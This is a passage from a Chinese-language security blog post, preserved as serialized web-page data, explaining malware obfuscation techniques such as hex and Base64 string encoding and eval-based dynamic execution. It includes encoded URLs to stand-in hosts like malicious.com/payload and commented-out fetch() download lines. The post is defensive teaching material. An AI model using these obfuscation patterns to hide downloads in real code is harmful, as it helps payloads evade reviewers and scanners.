3:I[9275,[],""]
5:I[1343,[],""]
6:I[8700,["599","static/chunks/ebde5ed1-51545511fe0d5050.js","231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","850","static/chunks/850-ecf153581cc02044.js","185","static/chunks/app/layout-54bebb918ae7f176.js"],"ThemeProviders"]
7:I[4080,["599","static/chunks/ebde5ed1-51545511fe0d5050.js","231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","850","static/chunks/850-ecf153581cc02044.js","185","static/chunks/app/layout-54bebb918ae7f176.js"],""]
8:I[9032,["599","static/chunks/ebde5ed1-51545511fe0d5050.js","231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","850","static/chunks/850-ecf153581cc02044.js","185","static/chunks/app/layout-54bebb918ae7f176.js"],"KBarSearchProvider"]
9:I[231,["231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","797","static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js"],""]
a:I[8173,["231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","797","static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js"],"Image"]
b:I[509,["599","static/chunks/ebde5ed1-51545511fe0d5050.js","231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","850","static/chunks/850-ecf153581cc02044.js","185","static/chunks/app/layout-54bebb918ae7f176.js"],"KBarButton"]
c:I[1398,["599","static/chunks/ebde5ed1-51545511fe0d5050.js","231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","850","static/chunks/850-ecf153581cc02044.js","185","static/chunks/app/layout-54bebb918ae7f176.js"],"default"]
d:I[7606,["599","static/chunks/ebde5ed1-51545511fe0d5050.js","231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","850","static/chunks/850-ecf153581cc02044.js","185","static/chunks/app/layout-54bebb918ae7f176.js"],"default"]
e:I[7510,["599","static/chunks/ebde5ed1-51545511fe0d5050.js","231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","850","static/chunks/850-ecf153581cc02044.js","185","static/chunks/app/layout-54bebb918ae7f176.js"],"default"]
f:I[8976,["599","static/chunks/ebde5ed1-51545511fe0d5050.js","231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","850","static/chunks/850-ecf153581cc02044.js","185","static/chunks/app/layout-54bebb918ae7f176.js"],"default"]
4:["slug","security/demystifying-obfuscation-techniques-in-malware","c"]
0:["Ts-6BBsjdSlBnGT_Ikyc2",[[["",{"children":["blog",{"children":[["slug","security/demystifying-obfuscation-techniques-in-malware","c"],{"children":["__PAGE__?{\"slug\":[\"security\",\"demystifying-obfuscation-techniques-in-malware\"]}",{}]}]}]},"$undefined","$undefined",true],["",{"children":["blog",{"children":[["slug","security/demystifying-obfuscation-techniques-in-malware","c"],{"children":["__PAGE__",{},[["$L1","$L2"],null],null]},["$","$L3",null,{"parallelRouterKey":"children","segmentPath":["children","blog","children","$4","children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/a9b9096fa657c0d0.css","precedence":"next","crossOrigin":"$undefined"}]]}],null]},["$","$L3",null,{"parallelRouterKey":"children","segmentPath":["children","blog","children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":null}],null]},[["$","html",null,{"lang":"en-us","className":"__variable_dd5b2f scroll-smooth","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","type":"image/png","href":"https://mainjaylai.github.io/favicon.png"}],["$","link",null,{"rel":"manifest","href":"/static/favicons/manifest.json"}],["$","meta",null,{"name":"msapplication-TileColor","content":"#000000"}],["$","link",null,{"href":"https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200..900&display=swap","rel":"stylesheet"}],["$","link",null,{"href":"https://fonts.googleapis.com/css2?family=ZCOOL+KuaiLe&family=ZCOOL+QingKe+HuangYou&family=ZCOOL+XiaoWei&display=swap","rel":"stylesheet"}],["$","script",null,{"src":"https://us.umami.is/script.js","async":true}],["$","meta",null,{"name":"theme-color","media":"(prefers-color-scheme: light)","content":"#fff"}],["$","meta",null,{"name":"theme-color","media":"(prefers-color-scheme: dark)","content":"#000"}],["$","meta",null,{"name":"referrer","content":"no-referrer"}],["$","script",null,{"src":"https://cdn.jsdelivr.net/gh/ashishagarwal2023/freegptjs@1.0.2/src/freegpt.min.js"}],["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml"}]]}],["$","body",null,{"className":"bg-white pl-[calc(100vw-100%)] text-black antialiased dark:bg-gray-950 dark:text-white","suppressHydrationWarning":true,"children":["$","$L6",null,{"children":[["$undefined","$undefined","$undefined",["$","$L7",null,{"async":true,"defer":true,"data-website-id":"bbe21cb3-3de3-4ba7-b6de-453053bc6ae8","src":"https://us.umami.is/script.js"}],"$undefined","$undefined"],["$","section",null,{"className":"mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0","children":["$","div",null,{"className":"flex h-screen flex-col justify-between font-sans","children":[["$","$L8",null,{"kbarConfig":{"searchDocumentsPath":"/search.json"},"children":[["$","header",null,{"className":"flex items-center justify-between py-5","children":[["$","div",null,{"children":["$","$L9",null,{"href":"/","aria-label":"Blog","children":["$","div",null,{"className":"flex items-center justify-between","children":[["$","div",null,{"className":"mr-3","children":["$","$La",null,{"src":"https://mainjaylai.github.io/favicon.png","width":44,"height":44,"alt":"logo"}]}],["$","div",null,{"className":"hidden h-[44px] text-center text-3xl font-semibold leading-10 sm:block","children":"Blog"}]]}]}]}],["$","div",null,{"className":"flex items-center space-x-4 leading-5 sm:space-x-6","children":[[["$","$L9",null,{"href":"/blog","className":"navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block","children":"Blog"}],["$","$L9",null,{"href":"/tags","className":"navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block","children":"Tags"}],["$","a",null,{"target":"_blank","rel":"noopener noreferrer","href":"https://mainjaylai.github.io","className":"navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block","children":"About"}]],["$","$Lb",null,{"aria-label":"Search","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","fill":"none","viewBox":"0 0 24 24","strokeWidth":1.5,"stroke":"currentColor","className":"h-6 w-6 text-gray-900 dark:text-gray-100","children":["$","path",null,{"strokeLinecap":"round","strokeLinejoin":"round","d":"M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"}]}]}],["$","$Lc",null,{}],["$","$Ld",null,{}],["$","$Le",null,{}],["$","$Lf",null,{}]]}]]}],["$","main",null,{"className":"mb-auto","children":["$","$L3",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"className":"flex flex-col items-start justify-start md:mt-24 md:flex-row md:items-center md:justify-center md:space-x-6","children":[["$","div",null,{"className":"space-x-2 pb-8 pt-6 md:space-y-5","children":["$","h1",null,{"className":"text-6xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 md:border-r-2 md:px-6 md:text-8xl md:leading-14","children":"404"}]}],["$","div",null,{"className":"max-w-md","children":[["$","p",null,{"className":"mb-4 text-xl font-bold leading-normal md:text-2xl","children":"Sorry we couldn't find this page."}],["$","p",null,{"className":"mb-8","children":"But dont worry, you can find plenty of other things on our homepage."}],["$","$L9",null,{"href":"/","className":"focus:shadow-outline-blue inline rounded-lg border border-transparent bg-blue-600 px-4 py-2 text-sm font-medium leading-5 text-white shadow transition-colors duration-150 hover:bg-blue-700 focus:outline-none dark:hover:bg-blue-500","children":"Back to homepage"}]]}]]}],"notFoundStyles":[],"styles":null}]}]]}],["$","footer",null,{"children":["$","div",null,{"className":"mt-16 flex flex-col items-center","children":[["$","div",null,{"className":"mb-3 flex space-x-4","children":[["$","a",null,{"className":"text-sm !text-gray-500 transition hover:text-gray-600","target":"_blank","rel":"noopener noreferrer","href":"mailto:mainjaylai@outlook.com","children":[["$","span",null,{"className":"sr-only","children":"mail"}],["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","viewBox":"0 0 20 20","className":"fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6","children":[["$","path",null,{"d":"M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"}],["$","path",null,{"d":"M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"}]]}]]}],["$","a",null,{"className":"text-sm !text-gray-500 transition hover:text-gray-600","target":"_blank","rel":"noopener noreferrer","href":"https://github.com/mainjaylai","children":[["$","span",null,{"className":"sr-only","children":"github"}],["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","viewBox":"0 0 24 24","className":"fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6","children":["$","path",null,{"d":"M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"}]}]]}],["$","a",null,{"className":"text-sm !text-gray-500 transition hover:text-gray-600","target":"_blank","rel":"noopener noreferrer","href":"https://gitlab.com/JayMain","children":[["$","span",null,{"className":"sr-only","children":"gitlab"}],["$","svg",null,{"viewBox":"0 0 1024 1024","xmlns":"http://www.w3.org/2000/svg","className":"fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6","width":"200","height":"200","children":["$","path",null,{"d":"M1022.08 579.712l-57.258667-176.426667-113.664-349.397333a19.413333 19.413333 0 0 0-36.992 0L700.501333 403.2H323.498667L209.877333 53.888C204.074667 35.84 178.56 35.84 172.8 53.76L59.136 403.157333 1.877333 579.712a39.424 39.424 0 0 0 14.122667 43.648L512 983.637333l496-360.234666a39.253333 39.253333 0 0 0 14.08-43.690667"}]}]]}],["$","a",null,{"className":"text-sm !text-gray-500 transition hover:text-gray-600","target":"_blank","rel":"noopener noreferrer","href":"https://gitee.com/lmj2001","children":[["$","span",null,{"className":"sr-only","children":"gitee"}],["$","svg",null,{"viewBox":"0 0 1024 1024","xmlns":"http://www.w3.org/2000/svg","className":"fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6","width":"200","height":"200","children":["$","path",null,{"d":"M512 992C246.895625 992 32 777.104375 32 512S246.895625 32 512 32s480 214.895625 480 480-214.895625 480-480 480z m242.9521875-533.3278125h-272.56875a23.7121875 23.7121875 0 0 0-23.71125 23.7121875l-0.024375 59.255625c0 13.08 10.6078125 23.7121875 23.6878125 23.7121875h165.96c13.104375 0 23.7121875 10.6078125 23.7121875 23.6878125v11.855625a71.1121875 71.1121875 0 0 1-71.1121875 71.1121875h-225.215625a23.7121875 23.7121875 0 0 1-23.6878125-23.7121875V423.1278125a71.1121875 71.1121875 0 0 1 71.0878125-71.1121875h331.824375a23.7121875 23.7121875 0 0 0 23.6878125-23.71125l0.0721875-59.2565625a23.7121875 23.7121875 0 0 0-23.68875-23.7121875H423.08a177.76875 177.76875 0 0 0-177.76875 177.7921875V754.953125c0 13.1034375 10.60875 23.7121875 23.713125 23.7121875h349.63125a159.984375 159.984375 0 0 0 159.984375-159.984375V482.36a23.7121875 23.7121875 0 0 0-23.7121875-23.6878125z"}]}]]}]]}],["$","div",null,{"className":"mb-2 flex space-x-2 text-sm text-gray-500 dark:text-gray-400","children":[["$","div",null,{"children":"MainJayLai"}],["$","div",null,{"children":" • "}],["$","div",null,{"children":"© 2025"}],["$","div",null,{"children":" • "}],["$","$L9",null,{"href":"/","children":"MainJayLai Blog"}]]}]]}]}]]}]}]]}]}]]}],null],null],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/c890694439b2475b.css","precedence":"next","crossOrigin":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/1ea5cf861ee12a80.css","precedence":"next","crossOrigin":"$undefined"}]],"$L10"]]]]
11:I[4347,["231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","797","static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js"],"default"]
12:I[408,["231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","797","static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js"],"default"]
13:I[9629,["231","static/chunks/231-34a6a67d2da26855.js","827","static/chunks/827-69594f61c16b8a9c.js","797","static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js"],"default"]
2:[["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"headline\":\"揭秘恶意软件中的代码混淆把戏：深入原理与实例\",\"datePublished\":\"2025-05-09T00:00:00.000Z\",\"dateModified\":\"2025-05-09T00:00:00.000Z\",\"description\":\"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。\",\"image\":\"https://pngimg.com/uploads/github/github_PNG80.png\",\"url\":\"https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware\",\"author\":[{\"@type\":\"Person\",\"name\":\"mainJayLai\"}]}"}}],["$","section",null,{"className":"mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0","children":[["$","$L11",null,{}],["$","article",null,{"children":["$","div",null,{"children":[["$","header",null,{"children":["$","div",null,{"className":"space-y-1 border-b border-gray-200 pb-10 text-center dark:border-gray-700","children":[["$","div",null,{"className":"beautiful-chinese-title","children":["$","h1",null,{"className":"text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14","children":"揭秘恶意软件中的代码混淆把戏：深入原理与实例"}]}],["$","dl",null,{"children":["$","div",null,{"children":[["$","dt",null,{"className":"sr-only","children":"Published on"}],["$","dd",null,{"className":"text-base font-medium leading-6 text-gray-500 dark:text-gray-400","children":["$","time",null,{"dateTime":"2025-05-09T00:00:00.000Z","children":"May 9, 2025"}]}]]}]}]]}]}],["$","div",null,{"className":"grid-rows-[auto_1fr] divide-y divide-gray-200 pb-8 dark:divide-gray-700 xl:divide-y-0","children":[["$","div",null,{"className":"divide-y divide-gray-200 dark:divide-gray-700 xl:col-span-3 xl:row-span-2 xl:pb-0","children":["$","div",null,{"className":"beautiful-chinese-content prose max-w-none pb-8 pt-10 dark:prose-invert","children":[["$","h2",null,{"className":"content-header","id":"引言看不见的威胁","children":[["$","a",null,{"href":"#引言看不见的威胁","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"引言：看不见的威胁"]}],["$","p",null,{"children":"“恶意软件包就在我们眼前，但直到为时已晚我们才发现它。” 这句话点出了一个残酷的现实：攻击者越来越依赖代码混淆（Obfuscation）技术，将恶意负载巧妙地伪装起来，试图绕过安全防御系统和代码审查人员的火眼金睛。理解这些跨越不同生态系统（如 npm、PyPI、Maven 和 Go 模块）的混淆技术，对于旨在保护其软件供应链的开发人员和安全团队至关重要。"}],["$","h2",null,{"className":"content-header","id":"什么是代码混淆","children":[["$","a",null,{"href":"#什么是代码混淆","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"什么是代码混淆？"]}],["$","p",null,{"children":["代码混淆是一种故意将清晰易读的源代码转换成难以理解、复杂甚至看似毫无意义的指令集的过程。在合法场景下，开发者可能会使用混淆技术来保护知识产权，或者通过代码压缩（Minification）来减小文件体积。然而，不幸的是，恶意行为者普遍滥用这种策略，以逃避自动化安全工具和人工审查流程的检测。其核心目标是：",["$","strong",null,{"children":"增加分析难度，延长被发现的时间，甚至完全躲避检测。"}]]}],["$","h2",null,{"className":"content-header","id":"常见的代码混淆技术及其原理剖析","children":[["$","a",null,{"href":"#常见的代码混淆技术及其原理剖析","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"常见的代码混淆技术及其原理剖析"]}],["$","p",null,{"children":"让我们深入探讨一些在各种生态系统中广泛应用的混淆方法，并详细解释其背后的原理。"}],["$","h3",null,{"className":"content-header","id":"1-字符串编码与字符操纵-encoded-strings--character-manipulation","children":[["$","a",null,{"href":"#1-字符串编码与字符操纵-encoded-strings--character-manipulation","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"1. 字符串编码与字符操纵 (Encoded Strings & Character Manipulation)"]}],["$","p",null,{"children":[["$","strong",null,{"children":"攻击者为何青睐此法："}]," 编码能够让攻击者隐藏关键的 URL、敏感令牌或恶意命令，使得自动化扫描器和人工审查难以迅速识别其恶意意图。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"如何帮助攻击者："}]," 可读的字符串（如 ",["$","code",null,{"className":"custom-code","children":"https://evil-domain.com/malware.exe"}],"）被转换为编码序列（如十六进制 ",["$","code",null,{"className":"custom-code","children":"\\x68\\x74\\x74\\x70..."}],"、Unicode ",["$","code",null,{"className":"custom-code","children":"\\u0068\\u0074..."}]," 或 Base64 ",["$","code",null,{"className":"custom-code","children":"aHR0cHM6Ly9ldmlsLWRvbWFpbi5jb20vbWFsd2FyZS5leGU="}],"）。这些编码后的字符串在代码中不再那么显眼，更容易与正常代码混为一谈。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"原理详解："}]," 计算机在处理字符时，本质上是处理其对应的数字编码（例如 ASCII、Unicode）。攻击者利用这一点，不直接在代码中写入明文字符串，而是写入这些字符的编码表示。程序在运行时，会先将这些编码值解码回原始字符串，然后再执行相应的操作。"]}],["$","ul",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":"十六进制/八进制编码："}]," 将每个字符用其十六进制（如 ",["$","code",null,{"className":"custom-code","children":"\\x41"}]," 代表 'A'）或八进制（如 ",["$","code",null,{"className":"custom-code","children":"\\101"}]," 代表 'A'）形式表示。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"Unicode 转义："}]," 使用 ",["$","code",null,{"className":"custom-code","children":"\\uXXXX"}]," 格式表示 Unicode 字符。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"Base64 编码："}]," 将二进制数据转换成由64个可打印字符组成的文本字符串，常用于隐藏较长的字符串或二进制内容。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"自定义编码/加密："}]," 攻击者甚至可能使用自定义的简单加密算法（如凯撒密码、XOR 加密）或更复杂的加密库来隐藏字符串，然后在运行时解密。"]}]]}],["$","$L12",null,{"className":"language-javascript","children":["$","code",null,{"className":"language-javascript code-highlight","children":[["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// 原始恶意 URL: \"http://malicious.com/payload\""}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// 十六进制编码示例"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"const"}]," encodedUrlHex ",["$","span",null,{"className":"token operator","children":"="}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token string","children":"'\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x6d\\x61\\x6c\\x69\\x63\\x69\\x6f\\x75\\x73\\x2e\\x63\\x6f\\x6d\\x2f\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64'"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// fetch(encodedUrlHex); // 运行时解码并执行"}],"\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// Base64 编码示例"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"const"}]," encodedUrlBase64 ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token string","children":"'aHR0cDovL21hbGljaW91cy5jb20vcGF5bG9hZA=='"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// fetch(atob(encodedUrlBase64)); // 运行时解码并执行 (atob是浏览器提供的Base64解码函数)"}],"\n"]}]]}]}],["$","h3",null,{"className":"content-header","id":"2-动态代码生成与执行-dynamic-code-generation--execution","children":[["$","a",null,{"href":"#2-动态代码生成与执行-dynamic-code-generation--execution","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"2. 动态代码生成与执行 (Dynamic Code Generation & Execution)"]}],["$","p",null,{"children":[["$","strong",null,{"children":"攻击者为何青睐此法："}]," 动态执行允许攻击者在不更改原始受感染包的情况下远程更新和传递有效负载，从而绕过基于静态分析的检测。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"如何帮助攻击者："}]," 使用如 ",["$","code",null,{"className":"custom-code","children":"eval()"}]," (JavaScript)、",["$","code",null,{"className":"custom-code","children":"exec()"}]," (Python)、",["$","code",null,{"className":"custom-code","children":"Runtime.exec()"}]," (Java) 等函数来执行在运行时生成或从远端获取的字符串形式的代码。这使得静态分析工具无法在分析阶段看到完整的恶意代码。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"原理详解："}]," 静态分析是在不实际运行代码的情况下检查代码。而动态代码生成与执行则将恶意代码的构建和执行推迟到程序运行时。"]}],["$","ul",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":[["$","code",null,{"className":"custom-code","children":"eval()"}],"/",["$","code",null,{"className":"custom-code","children":"exec()"}]," 类函数："]}]," 这些函数接收一个字符串作为参数，并将该字符串当作代码来执行。攻击者可以将恶意代码拆分成碎片，或者从远程服务器下载，然后在运行时拼接成完整的代码字符串再通过 ",["$","code",null,{"className":"custom-code","children":"eval()"}]," 执行。"]}],["$","li",null,{"children":[["$","strong",null,{"children":[["$","code",null,{"className":"custom-code","children":"document.write()"}]," / ",["$","code",null,{"className":"custom-code","children":"innerHTML"}]," (浏览器环境)："]}]," 在 Web 环境中，攻击者可能动态地将 ",["$","code",null,{"className":"custom-code","children":"<script>"}]," 标签写入 DOM，从而执行新的脚本。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"反射 (Reflection) (Java, .NET)："}]," 允许程序在运行时检查和修改其自身结构（类、方法、字段等），可以被用来动态调用隐藏的方法或加载恶意类。"]}]]}],["$","$L12",null,{"className":"language-javascript","children":["$","code",null,{"className":"language-javascript code-highlight","children":[["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// 示例：动态构建并执行 alert(\"hacked!\")"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"const"}]," parts ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token punctuation","children":"["}],["$","span",null,{"className":"token string","children":"'al'"}],["$","span",null,{"className":"token punctuation","children":","}]," ",["$","span",null,{"className":"token string","children":"'er'"}],["$","span",null,{"className":"token punctuation","children":","}]," ",["$","span",null,{"className":"token string","children":"'t('"}],["$","span",null,{"className":"token punctuation","children":","}]," ",["$","span",null,{"className":"token string","children":"'\"hacked!\"'"}],["$","span",null,{"className":"token punctuation","children":","}]," ",["$","span",null,{"className":"token string","children":"')'"}],["$","span",null,{"className":"token punctuation","children":"]"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"const"}]," evilCode ",["$","span",null,{"className":"token operator","children":"="}]," parts",["$","span",null,{"className":"token punctuation","children":"."}],["$","span",null,{"className":"token function method property-access","children":"join"}],["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token string","children":"''"}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token comment","children":"// \"alert(\\\"hacked!\\\")\""}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// eval(evilCode);"}],"\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// 从远程获取代码执行 